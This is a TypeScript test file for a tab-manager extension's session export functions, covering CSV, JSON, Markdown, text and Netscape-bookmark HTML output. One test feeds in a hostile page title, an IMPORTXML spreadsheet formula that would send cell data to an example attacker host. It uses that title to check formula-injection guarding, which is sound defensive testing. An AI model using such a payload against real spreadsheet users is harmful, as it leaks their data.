import { describe, expect, it } from 'vitest';

import {
  CSV_HEADER,
  csvEscape,
  csvGuardFormula,
  escapeHtml,
  exportFilename,
  scopeToSession,
  toCsv,
  toHtml,
  toJson,
  toMarkdown,
  toText,
} from '@/lib/session-export';
import { contentHash } from '@/lib/session-hash';
import type { Session } from '@/types';

const work: Session = {
  schemaVersion: 1,
  id: 'a1',
  kind: 'saved',
  name: 'Work',
  origin: 'manual',
  createdAt: 1_700_000_000_123,
  updatedAt: 1_700_000_050_999,
  contentHash: 'deadbeef',
  windows: [
    {
      state: 'normal',
      focused: true,
      bounds: { left: 0, top: 0, width: 800, height: 600 },
      groups: [
        { title: 'Dev', color: 'blue', collapsed: false },
        { title: 'Empty', color: 'red', collapsed: true },
        { title: 'Docs', color: 'green', collapsed: false },
      ],
      tabs: [
        { url: 'https://pinned.test/', title: 'Pinned', pinned: true, active: false },
        { url: 'https://a.test/', title: 'A', pinned: false, active: true },
        { url: 'https://b.test/', title: 'B', pinned: false, active: false, groupIndex: 0 },
        { url: 'https://c.test/', title: 'C', pinned: false, active: false, groupIndex: 0 },
        { url: 'https://d.test/', title: 'D', pinned: false, active: false, groupIndex: 2 },
      ],
    },
    {
      state: 'maximized',
      focused: false,
      groups: [],
      tabs: [{ url: 'https://e.test/', title: 'E', pinned: false, active: true }],
    },
  ],
};

const play: Session = {
  schemaVersion: 1,
  id: 'b2',
  kind: 'saved',
  name: 'Play',
  origin: 'manual',
  createdAt: 1_700_000_000_000,
  updatedAt: 1_700_000_000_000,
  windows: [
    {
      state: 'normal',
      focused: true,
      groups: [],
      tabs: [{ url: 'https://f.test/', title: 'F', pinned: false, active: true }],
    },
  ],
};

describe('csvEscape', () => {
  it('leaves plain fields alone', () => {
    expect(csvEscape('plain')).toBe('plain');
    expect(csvEscape('')).toBe('');
  });

  it('quotes fields with a comma, quote or line break and doubles quotes', () => {
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape('line\nbreak')).toBe('"line\nbreak"');
    expect(csvEscape('cr\rbreak')).toBe('"cr\rbreak"');
  });
});

describe('csvGuardFormula', () => {
  it('neutralises every leading character a spreadsheet would treat as a formula', () => {
    for (const risky of ['=', '+', '-', '@', '\t', '\r']) {
      expect(csvGuardFormula(`${risky}cmd(1)`)).toBe(`'${risky}cmd(1)`);
    }
  });

  it('leaves ordinary text alone', () => {
    expect(csvGuardFormula('')).toBe('');
    expect(csvGuardFormula('Inbox (12) - Mail')).toBe('Inbox (12) - Mail');
    expect(csvGuardFormula('https://a.test/?a=1')).toBe('https://a.test/?a=1');
    // Only the FIRST character decides; a formula character further in is harmless.
    expect(csvGuardFormula('2+2=4')).toBe('2+2=4');
  });

  it('is independent of RFC 4180 quoting: a risky field that also needs quotes gets both', () => {
    expect(csvEscape(csvGuardFormula('=SUM(A1,A2)'))).toBe(`"'=SUM(A1,A2)"`);
  });
});

describe('toCsv', () => {
  it('writes the header and one row per tab in strip order with 1-based positions', () => {
    expect(toCsv([work, play])).toBe(
      [
        CSV_HEADER,
        'Work,1,,1,true,Pinned,https://pinned.test/',
        'Work,1,,2,false,A,https://a.test/',
        'Work,1,Dev,3,false,B,https://b.test/',
        'Work,1,Dev,4,false,C,https://c.test/',
        'Work,1,Docs,5,false,D,https://d.test/',
        'Work,2,,1,false,E,https://e.test/',
        'Play,1,,1,false,F,https://f.test/',
        '',
      ].join('\n'),
    );
  });

  it('quotes session names, group titles, titles and urls that need it', () => {
    const tricky: Session = {
      ...play,
      name: 'Read, later',
      windows: [
        {
          state: 'normal',
          focused: true,
          groups: [{ title: 'Q&A "group"', color: 'grey', collapsed: false }],
          tabs: [
            {
              url: 'https://x.test/?a=1,2',
              title: 'Multi\nline',
              pinned: false,
              active: true,
              groupIndex: 0,
            },
          ],
        },
      ],
    };
    expect(toCsv([tricky])).toBe(
      `${CSV_HEADER}\n"Read, later",1,"Q&A ""group""",1,false,"Multi\nline","https://x.test/?a=1,2"\n`,
    );
  });

  it('guards a hostile page title (and url) against spreadsheet formula injection', () => {
    const hostile: Session = {
      ...play,
      name: '@Session',
      windows: [
        {
          state: 'normal',
          focused: true,
          groups: [{ title: '+Group', color: 'grey', collapsed: false }],
          tabs: [
            {
              // A site chooses its own document.title; this one would read the neighbouring cell.
              url: 'https://evil.test/',
              title: '=IMPORTXML("https://evil.test/?d="&A1,"//a")',
              pinned: false,
              active: true,
              groupIndex: 0,
            },
            { url: '-tel:+1', title: 'Plain', pinned: false, active: false },
          ],
        },
      ],
    };

    const rows = parseCsv(toCsv([hostile]));
    // Round trip: a CSV parser gives back exactly the original text with the one guard apostrophe
    // in front of it (a spreadsheet consumes that apostrophe and shows the text as the page wrote
    // it, but as text - never as a formula).
    expect(rows[1]).toEqual([
      "'@Session",
      '1',
      "'+Group",
      '1',
      'false',
      '\'=IMPORTXML("https://evil.test/?d="&A1,"//a")',
      'https://evil.test/',
    ]);
    expect(rows[2]).toEqual(["'@Session", '1', '', '2', 'false', 'Plain', "'-tel:+1"]);
  });
});

/** Minimal RFC 4180 reader, so the round trip above is checked by a parser and not by eye. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const char = text[i];
    if (quoted) {
      if (char !== '"') {
        field += char;
      } else if (text[i + 1] === '"') {
        field += '"';
        i += 1;
      } else {
        quoted = false;
      }
      continue;
    }
    if (char === '"' && field === '') {
      quoted = true;
    } else if (char === ',') {
      row.push(field);
      field = '';
    } else if (char === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
    } else {
      field += char;
    }
  }
  if (field !== '' || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

describe('toJson', () => {
  it('wraps the sessions in a pretty-printed export bundle', () => {
    const text = toJson([work], 42);
    expect(text.endsWith('\n')).toBe(true);
    expect(text).toContain('\n  "app": "tab-organizer",');
    expect(JSON.parse(text)).toEqual({
      app: 'tab-organizer',
      schemaVersion: 1,
      exportedAt: 42,
      sessions: [work],
    });
  });
});

describe('toMarkdown', () => {
  it('renders session / window / group headings with pinned markers and skips empty groups', () => {
    expect(toMarkdown([work, play])).toBe(
      [
        '## Work',
        '',
        '### Window 1',
        '- [Pinned](https://pinned.test/) (pinned)',
        '- [A](https://a.test/)',
        '#### Dev',
        '- [B](https://b.test/)',
        '- [C](https://c.test/)',
        '#### Docs',
        '- [D](https://d.test/)',
        '',
        '### Window 2',
        '- [E](https://e.test/)',
        '',
        '## Play',
        '',
        '### Window 1',
        '- [F](https://f.test/)',
        '',
      ].join('\n'),
    );
  });

  it('escapes brackets in titles, encodes parens in urls and falls back to the url', () => {
    const session: Session = {
      ...play,
      windows: [
        {
          state: 'normal',
          focused: true,
          groups: [],
          tabs: [
            {
              url: 'https://en.wikipedia.org/wiki/Foo_(bar)',
              title: '[Draft] Foo \\ bar',
              pinned: false,
              active: true,
            },
            { url: 'https://untitled.test/', title: '', pinned: false, active: false },
          ],
        },
      ],
    };
    expect(toMarkdown([session])).toBe(
      [
        '## Play',
        '',
        '### Window 1',
        '- [\\[Draft\\] Foo \\\\ bar](https://en.wikipedia.org/wiki/Foo_%28bar%29)',
        '- [https://untitled.test/](https://untitled.test/)',
        '',
      ].join('\n'),
    );
  });

  it('returns an empty string for no sessions', () => {
    expect(toMarkdown([])).toBe('');
  });
});

describe('toText', () => {
  it('lists one url per line with blank lines between windows and sessions', () => {
    expect(toText([work, play])).toBe(
      [
        'https://pinned.test/',
        'https://a.test/',
        'https://b.test/',
        'https://c.test/',
        'https://d.test/',
        '',
        'https://e.test/',
        '',
        'https://f.test/',
        '',
      ].join('\n'),
    );
  });

  it('skips windows without tabs', () => {
    const session: Session = {
      ...play,
      windows: [{ state: 'normal', focused: true, groups: [], tabs: [] }, ...play.windows],
    };
    expect(toText([session])).toBe('https://f.test/\n');
    expect(toText([])).toBe('');
  });
});

describe('escapeHtml', () => {
  it('escapes the five HTML special characters', () => {
    expect(escapeHtml(`<a href="x">Tom & Jerry's</a>`)).toBe(
      '&lt;a href=&quot;x&quot;&gt;Tom &amp; Jerry&#39;s&lt;/a&gt;',
    );
  });
});

describe('toHtml', () => {
  it('nests session, window and group folders in Netscape bookmark format', () => {
    const html = toHtml([work]);
    expect(html.startsWith('<!DOCTYPE NETSCAPE-Bookmark-file-1>\n')).toBe(true);
    expect(html).toContain(
      [
        '<DL><p>',
        '    <DT><H3 ADD_DATE="1700000000" LAST_MODIFIED="1700000050">Work</H3>',
        '    <DL><p>',
        '        <DT><H3 ADD_DATE="1700000000">Window 1</H3>',
        '        <DL><p>',
        '            <DT><A HREF="https://pinned.test/" ADD_DATE="1700000000">Pinned</A>',
        '            <DT><A HREF="https://a.test/" ADD_DATE="1700000000">A</A>',
        '            <DT><H3 ADD_DATE="1700000000">Dev</H3>',
        '            <DL><p>',
        '                <DT><A HREF="https://b.test/" ADD_DATE="1700000000">B</A>',
        '                <DT><A HREF="https://c.test/" ADD_DATE="1700000000">C</A>',
        '            </DL><p>',
        '            <DT><H3 ADD_DATE="1700000000">Docs</H3>',
        '            <DL><p>',
        '                <DT><A HREF="https://d.test/" ADD_DATE="1700000000">D</A>',
        '            </DL><p>',
        '        </DL><p>',
        '        <DT><H3 ADD_DATE="1700000000">Window 2</H3>',
        '        <DL><p>',
        '            <DT><A HREF="https://e.test/" ADD_DATE="1700000000">E</A>',
        '        </DL><p>',
        '    </DL><p>',
        '</DL><p>',
        '',
      ].join('\n'),
    );
    expect(html).not.toContain('Empty');
  });

  it('HTML-escapes names, titles and urls', () => {
    const session: Session = {
      ...play,
      name: 'R&D <2026>',
      windows: [
        {
          state: 'normal',
          focused: true,
          groups: [{ title: '"Quoted"', color: 'grey', collapsed: false }],
          tabs: [
            {
              url: 'https://x.test/?a=1&b="2"',
              title: `<b>Bold</b> & 'quoted'`,
              pinned: false,
              active: true,
              groupIndex: 0,
            },
          ],
        },
      ],
    };
    const html = toHtml([session]);
    expect(html).toContain('>R&amp;D &lt;2026&gt;</H3>');
    expect(html).toContain('>&quot;Quoted&quot;</H3>');
    expect(html).toContain(
      '<DT><A HREF="https://x.test/?a=1&amp;b=&quot;2&quot;" ADD_DATE="1700000000">&lt;b&gt;Bold&lt;/b&gt; &amp; &#39;quoted&#39;</A>',
    );
    expect(html).not.toContain('<b>');
  });
});

describe('scopeToSession', () => {
  it('returns the whole session unchanged for a session scope', () => {
    expect(scopeToSession({ session: work })).toBe(work);
  });

  it('keeps only the selected window and recomputes contentHash', () => {
    const result = scopeToSession({ session: work, windowIndex: 1 });
    expect(result.windows).toEqual([work.windows[1]]);
    expect(result.contentHash).toBe(contentHash([work.windows[1]]));
    expect(result.name).toBe('Work');
    expect(work.windows).toHaveLength(2);
  });

  it("keeps only the group's tabs and re-indexes the group to 0", () => {
    const result = scopeToSession({ session: work, windowIndex: 0, groupIndex: 2 });
    expect(result.windows).toEqual([
      {
        state: 'normal',
        focused: true,
        bounds: { left: 0, top: 0, width: 800, height: 600 },
        groups: [{ title: 'Docs', color: 'green', collapsed: false }],
        tabs: [{ url: 'https://d.test/', title: 'D', pinned: false, active: false, groupIndex: 0 }],
      },
    ]);
    expect(result.contentHash).toBe(contentHash(result.windows));
  });

  it('drops the window entirely for a group without tabs', () => {
    expect(scopeToSession({ session: work, windowIndex: 0, groupIndex: 1 }).windows).toEqual([]);
  });

  it('leaves contentHash absent when the source has none', () => {
    const result = scopeToSession({ session: play, windowIndex: 0 });
    expect('contentHash' in result).toBe(false);
  });

  it('throws RangeError for indexes that do not exist', () => {
    expect(() => scopeToSession({ session: work, windowIndex: 5 })).toThrow(RangeError);
    expect(() => scopeToSession({ session: work, windowIndex: 0, groupIndex: 9 })).toThrow(
      RangeError,
    );
  });
});

describe('exportFilename', () => {
  it('slugifies the base and stamps local yyyyMMdd-HHmm', () => {
    const date = new Date(2026, 7, 29, 14, 3);
    expect(exportFilename('Work Session · 3 windows', 'json', date)).toBe(
      'tabinet-work-session-3-windows-20260829-1403.json',
    );
    expect(exportFilename('Work', 'markdown', date)).toBe('tabinet-work-20260829-1403.md');
    expect(exportFilename('Work', 'text', date)).toBe('tabinet-work-20260829-1403.txt');
    expect(exportFilename('Work', 'html', date)).toBe('tabinet-work-20260829-1403.html');
    expect(exportFilename('Work', 'csv', date)).toBe('tabinet-work-20260829-1403.csv');
  });

  it('omits the slug segment when nothing survives slugification', () => {
    expect(exportFilename('···', 'json', new Date(2026, 0, 5, 9, 7))).toBe(
      'tabinet-20260105-0907.json',
    );
  });
});
